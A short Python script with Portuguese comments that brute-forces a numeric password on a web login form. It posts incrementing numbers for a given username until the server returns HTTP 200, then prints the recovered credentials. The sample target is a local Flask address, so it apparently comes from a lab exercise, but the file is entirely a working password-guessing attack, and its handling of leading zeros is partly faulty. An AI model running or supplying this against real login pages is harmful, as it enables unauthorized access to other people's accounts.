import requests
import time
import sys

#Para rodar o programa exeuctar python3 seu_script.py link_do_site(ex: http://127.0.0.1:1234/login) Nome_do_usuario

inicio = time.time() #utilizamos para contar o tempo de execucao

if len(sys.argv) < 3:
    print("Por favor, forneça a URL e o nome de usuário como argumentos.")
    sys.exit(1)

url = sys.argv[1] #url gerada pelo flask - alterar para o seu caso
usuario = sys.argv[2]

senha = 0 #inicia em zero e vai incrementando ate achar a senha do usuario

dados = {
    'username': usuario, #insira aqui o nome do usuario que queremos a senha
    'password': senha
}

response = requests.post(url, data=dados) #mandamos para o alvo as informacoes de usuario e senha

tam = 1
while response.status_code != 200: #loop para achar a senha numerica
    salva = senha
    senha += 1
    dados['password'] = senha
    response = requests.post(url, data=dados)
    if response.status_code == 200:
        break
    if len(str(senha)) > tam: #caso a senha comece com 0 na frente
        dobro = senha * 2
        while senha < dobro:
            lista = list(str(senha))
            lista[0] = '0'
            num_lista = ''.join(lista)
            dados['password'] = num_lista
            response = requests.post(url, data=dados)
            if response.status_code == 200:
                break
            senha += 1
        if response.status_code == 200:
            break
        tam += 1
        senha = salva + 1

if response.status_code == 200: 
    print('Login Bem-Sucedido!')
    print('nome:', dados['username'])
    print('senha:', dados['password'])
else:
    print('Falha no login')

fim = time.time()

tempo_decorrido = round(fim - inicio, 4)
print("Tempo decorrido:", tempo_decorrido, "segundos")